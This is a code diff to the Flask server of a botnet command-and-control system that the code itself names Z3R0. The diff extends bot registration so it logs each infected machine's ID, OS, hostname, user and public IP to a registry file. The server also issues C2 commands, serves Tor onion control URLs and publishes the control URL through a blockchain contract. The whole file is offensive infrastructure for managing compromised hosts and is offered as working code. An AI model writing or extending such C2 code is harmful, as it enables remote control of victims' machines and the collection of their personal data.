@@ -27,12 +27,9 @@ import cv2
 import psutil
 from subprocess import Popen, PIPE
 import csv
-import csv
 import stat
 from urllib.parse import urlparse
 from flask import Flask, request, jsonify, send_from_directory
-
-
 
 CURRENT_DIR = Path(__file__).resolve().parent
 PROJECT_ROOT = CURRENT_DIR
@@ -212,21 +209,31 @@ def decrypt_data(encrypted_data):
 # --- API Endpoints ---
 @app.route('/api/bot/register', methods=['POST'])
 def register_bot():
-    encrypted_data = request.data
-    decrypted_data = decrypt_data(encrypted_data)
-    data = json.loads(decrypted_data)
+    control_url = get_control_url()
+    registration_url = f"{control_url}/api/bot/register"
+    print(f"Payload Recived at {registration_url}...Registering Now...")
+    try:
+        data = json.loads(decrypt_data(request.data))  # decrypt data
+    except Exception:
+        logger.warning("Invalid JSON in registration request.")
+        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
+
     bot_id = data.get('id')
-    info = data.get('info')
+    info = data.get('info', {})
     public_ip = info.get('ip')
     os_info = info.get('os')
+    hostname = info.get('hostname')
+    user = info.get('user')
     bots[bot_id] = {'info': info, 'last_seen': time.time(), 'public_ip': public_ip, 'status': 'green'}
     save_bot_to_registry(bot_id, public_ip, os_info)
+    print(f"{Colors.GREEN}Payload Registration Sucess{Colors.RESET}")
+    print(f"{Colors.GREEN}Cached Bot Credentials Saved as [\"BOT-ID >>> \"{bot_id}\n, \"BOT-OS >>>\" {os_info}\n,\"BOT-HOST >>> \"{hostname}\n, \"BOT-USER >>> \"{user}\n, \"BOT-IP >>> \"{public_ip} > > > > > > SAVED TO: \"Z3R0_Bot_Registry.csv\" for next boot\"]...{Colors.RESET}")
     logger.info(f"Registered new bot: {bot_id} with public IP: {public_ip}")
     response_payload = {'status': 'ok'}
-    control_url = get_control_url()
     if control_url:
         response_payload['control_url'] = control_url
     return jsonify(response_payload)
+
 
 @app.route('/api/registered_bots', methods=['GET'])
 def registered_bots():
@@ -308,6 +315,7 @@ def get_nodes():
         return jsonify([{'onion_url': control_url, 'status': 'green'}])
     else:
             return jsonify([])
+
 @app.route('/api/c2/command', methods=['POST'])
 def issue_c2_command():
     data = request.json
@@ -329,6 +337,18 @@ def issue_c2_command():
 
 from web3 import Web3
 from botnet.blockchain_utils import GANACHE_URL
+
+class Colors:
+    GREEN = '[92m'
+    YELLOW = '[93m'
+    RED = '[91m'
+    CYAN = '[96m'
+    RESET = '[0m'
+
+def print_endpoints(app):
+    print(f"{Colors.CYAN}Active Endpoints:{Colors.RESET}")
+    for rule in app.url_map.iter_rules():
+        print(f"{Colors.CYAN}- {rule.endpoint}: {', '.join(rule.methods)} {rule.rule}{Colors.RESET}")
 
 # --- Blockchain Integration ---
 CONTRACT_META_FILE = "botnet/contract_meta.json"
@@ -360,13 +380,24 @@ def update_c2_url_on_blockchain(c2_url):
     except Exception as e:
         logger.error(f"Error updating C2 URL on the blockchain: {e}")
 
-
+def registration_logging_thread():
+    while True:
+        control_url = get_control_url()
+        if control_url:
+            registration_url = f"{control_url}/api/bot/register"
+            print(f"{Colors.YELLOW}Awaiting json Payload To Begin Persistant Bot Registration With C2, SEND PAYLOAD TO >>> {registration_url} {Colors.RESET}")
+        time.sleep(15)
 
 def main():
     # Start status checking thread
     status_thread = threading.Thread(target=check_bot_statuses)
     status_thread.daemon = True
     status_thread.start()
+
+    # Start registration logging thread
+    reg_log_thread = threading.Thread(target=registration_logging_thread)
+    reg_log_thread.daemon = True
+    reg_log_thread.start()
 
     # Ensure torsite HTML matches the current CONTROL-URL at startup
     current_url = get_control_url()
@@ -385,9 +416,10 @@ def main():
         logger.info(message)
         print(f"[*] {message}")
     else:
-        logger.warning("No control URL configured; update CONTROL-URL for onion address.")
+        logger.warning("No Command And Control URL configured; Check ~/CONTROL-URL for onion address.")
 
     app.run(host='0.0.0.0', port=5000)
 
 if __name__ == '__main__':
+    print_endpoints(app)
     main()
